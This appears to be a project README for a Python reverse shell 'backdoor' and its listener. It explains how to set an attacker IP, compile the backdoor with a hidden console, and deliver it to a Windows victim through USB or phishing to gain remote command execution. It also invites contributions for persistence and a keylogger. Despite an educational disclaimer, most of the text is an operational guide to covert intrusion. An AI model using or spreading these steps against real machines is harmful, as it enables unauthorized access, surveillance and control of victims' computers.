#  Python Reverse Shell Tool

*Python Reverse Shell Tool* is a simple client-server command-line utility used for educational penetration testing purposes. It enables a remote shell connection from a target machine back to an attacker's server using raw sockets in Python.

---

##  What It Does

- Establishes a reverse shell from a victim machine (backdoor.py) to an attacker-controlled server (server.py).
- Lets the attacker run remote commands (e.g., dir, cd Desktop, ipconfig, whoami).
- Handles command execution, directory navigation, and proper cleanup.

---

##  Features

-  Bi-directional communication (send and receive shell commands)
-  Basic error handling and command parsing
-  Handles cd command to change directories
-  Clean exit with "exit" command
-  No third-party libraries needed

---

## File Structure

- server.py: Listens for incoming connections, sends commands, receives output.
- backdoor.py: Connects back to the server and executes received commands.

---

##  How to Run

### 1. Set the IP and port

Ensure both scripts share the same:
python
host = 'YOUR.ATTACKER.IP.ADDRESS'
port = 5555


Use ipconfig or ip a to get the attacker's IP.

---

###  2. Start the listener (server)

On the attacker's machine:
bash
python3 server.py


---

###  3. Deploy the backdoor (target)

On the victim machine:

pyinstaller --onefile --noconsole backdoor.py


Then run dist/backdoor.exe on the target.

---

## 4 Example Use Case

1. Run server.py on Kali Linux.
2. Send backdoor.exe to Windows victim (via USB, phishing, etc.).
3. Victim runs the backdoor.
4. You gain shell access and execute system commands.

---

##  Requirements

- Python 3 installed on both machines.
- Optionally:
  - pyinstaller for compiling:
      pip install pyinstaller
    

---

##  Want to Contribute?

Contributions for enhancements (encryption, GUI, persistence, keylogger, etc.) are welcome!

- Fork the project
- Create a new branch
- Push your changes
- Submit a pull request

---

## ⚠ Legal Disclaimer

> This tool is intended *only for educational purposes* and *authorized penetration testing*.  
> Any misuse against systems without consent is *illegal* and *punishable by law*.  
> The developer takes *no responsibility* for any misuse or damage caused.

---
